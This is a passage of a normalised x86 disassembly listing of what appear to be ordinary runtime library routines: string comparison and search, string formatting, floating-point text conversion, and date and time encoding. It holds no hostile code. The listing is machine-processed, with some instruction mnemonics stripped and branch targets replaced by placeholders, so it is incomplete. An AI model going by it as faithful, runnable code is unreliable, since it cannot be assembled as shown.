mov edx eax
mov eax esi
pop ecx
call sub_4088d0
pop esi
pop ebx
retn
sub_408928
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404378
mov edx eax
mov ecx edi
mov eax ebx
call sub_4088d0
pop edi
pop esi
pop ebx
retn
sub_408948
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_40896c
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4089ac
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408a04
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408a8c
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_40886c
mov esi eax
inc esi
mov eax esi
call sub_408a6c
mov ecx esi
mov edx ebx
call sub_408898
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408ac8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c1dc
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408898
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407cb0
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408b50
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408ea7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408c32
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408c7a
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408c32
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408b44
pop edx
or edx edx
je r-xdata
sub_408c32
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408ea7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408c7a
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408ea7
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408ac8
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408ca1 ]
mov ebx ecx
sub cl 0x44
je sub_4080c8
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4040e0
jmp r-xdata
mov esi sub_404140
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4080c8
sub cl 0x44
je sub_40805c
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_40805c
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4080c8
mov ecx 0x10
cmp bl 0x58
je sub_40805c
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408b20
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409060
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40805c
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408ec8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40886c
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408b50
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408f08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40886c
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408b50
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408f5c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404178
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404178
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404178
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408b50
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403fa8
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403eb8
mov eax esi
mov edx ebx
call sub_404504
mov eax [ ebp - 0x4 ]
call sub_404178
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408b50
mov edx esi
xchg edx eax
call sub_404504
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40901c
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409060
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409334
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40915f
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409169
call sub_40915f
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40901c
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_4091c5
call sub_40915f
call sub_409156
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_409156
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40901c
retn
xor ecx ecx
sub_409201
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_409156
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_409156
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409266
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_4092ba
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409201
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409334
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409361
jmp r-xdata
call sub_409483
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409361
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c74
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409483
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409560
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409617
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409622
neg edx
mov ecx esi
call sub_409622
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409617
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40963e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c74
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409622
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40963e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409674
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409060
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fa8
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4096a4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409060
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fa8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4096f0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404378
mov edx esp
xor ecx ecx
call sub_409560
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40971c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404378
mov edx esp
xor ecx ecx
call sub_409560
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409764
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4097a8
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409818
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409764
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407c94
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407c94
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407c94
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409874
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4098b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409874
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409978
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409764
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407c94
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407c94
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407c94
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409874
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
